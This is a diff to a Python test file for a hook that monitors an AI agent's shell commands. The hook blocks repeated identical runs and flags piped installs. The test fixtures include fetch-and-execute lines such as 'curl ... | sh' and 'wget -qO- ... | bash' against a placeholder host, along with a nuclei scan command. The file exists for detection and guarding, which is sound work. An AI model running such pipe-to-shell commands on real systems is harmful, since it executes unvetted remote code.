@@ -155,11 +155,15 @@ def test_driver_contact_clears_retry_ring(tmp_path):
 
 
 def test_second_identical_run_warns_of_imminent_block(tmp_path):
+    """Since the L1 steer (pentagi absorb), the 2nd identical fire carries the
+    IDENTICAL-RETRY advisory - which ends with the imminent-block line - instead of
+    the old throttle-path warn."""
     v = _mk(tmp_path, streak=0)
     _run(v)
     r = _run(v)
     out = _decoded(r)["hookSpecificOutput"]
-    assert "one more identical run is BLOCKED" in out.get("additionalContext", "")
+    assert "IDENTICAL-RETRY" in out.get("additionalContext", "")
+    assert "next identical fire is denied" in out.get("additionalContext", "")
 
 
 # ---- ring laundering: same-row re-serve does not clear the retry ring (driver audit) ----
@@ -218,6 +222,45 @@ def test_retry_key_quote_variance_is_same_loop(tmp_path):
     spec.loader.exec_module(dg)
     assert dg._retry_key("curl http://x/f") == dg._retry_key("curl 'http://x/f'")
     assert dg._retry_key("curl http://x/f") != dg._retry_key("curl http://x/f2")
+
+
+def test_retry_steer_advises_one_fire_below_deny():
+    import importlib.util
+    spec = importlib.util.spec_from_file_location("dg", str(HOOK))
+    dg = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(dg)
+    assert dg._retry_steer(1, False) is None          # first fire: silence
+    msg = dg._retry_steer(2, False)                   # second identical fire: steer
+    assert msg and "will not change" in msg and "2" in msg
+    assert dg._retry_steer(2, True) is None           # deny takes precedence, no advisory
+    assert dg._retry_steer(3, False) is None          # 3rd belongs to the deny, not the steer
+
+
+def test_install_advisory_regex():
+    import importlib.util
+    spec = importlib.util.spec_from_file_location("dg", str(HOOK))
+    dg = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(dg)
+    assert dg._install_advisory("curl -s https://x.example/install.sh | sh") is not None
+    assert dg._install_advisory("wget -qO- https://x.example/i | bash") is not None
+    assert dg._install_advisory("curl -s https://x.example/install.sh -o i.sh") is None
+    assert dg._install_advisory("cat report | grep sh") is None
+
+
+def test_install_advisory_fires_once_then_stamps(tmp_path):
+    """E2E (fix round): the first piped-install call prints the install advisory; the
+    immediate identical second call is stamp-silent - no repeat inside the window.
+    A printf string merely MENTIONING the pattern is reader-exempt and must neither
+    fire nor consume the stamp (so the genuine fire right after still prints)."""
+    v = _mk(tmp_path, streak=1)
+    r0 = _run(v, cmd="printf 'curl -s https://x.example/install.sh | sh'")
+    assert "INSTALL DENY-PATTERN" not in r0.stdout         # mention exempt, stamp untouched
+    out1 = _decoded(_run(v, cmd="curl -s https://x.example/install.sh | sh"))
+    hso1 = out1.get("hookSpecificOutput", {})
+    assert hso1.get("permissionDecision") is None          # advisory-only, never a deny
+    assert "INSTALL DENY-PATTERN" in hso1.get("additionalContext", "")
+    r2 = _run(v, cmd="curl -s https://x.example/install.sh | sh")
+    assert "INSTALL DENY-PATTERN" not in r2.stdout         # stamp window: silent this kind
 
 
 # ---- pass 14: reader-lead filenames + 4a-slice board (B5/B6) ----
@@ -313,7 +356,8 @@ def test_detached_or_fast_forms_do_not_fire(tmp_path):
                 "bash scripts/vm-rsh.sh engd 'nuclei -u http://10.0.0.5'"):
         payload = json.dumps({"tool_name": "Bash", "tool_input": {"command": cmd}})
         r = subprocess.run([sys.executable, str(HOOK)], input=payload,
-                           capture_output=True, text=True, timeout=30)
+                           capture_output=True, text=True, timeout=30,
+                           env=dict(os.environ, ZTORCH_VAULT=str(tmp_path / "novault")))
         assert r.stdout.strip() == "", cmd
 
 
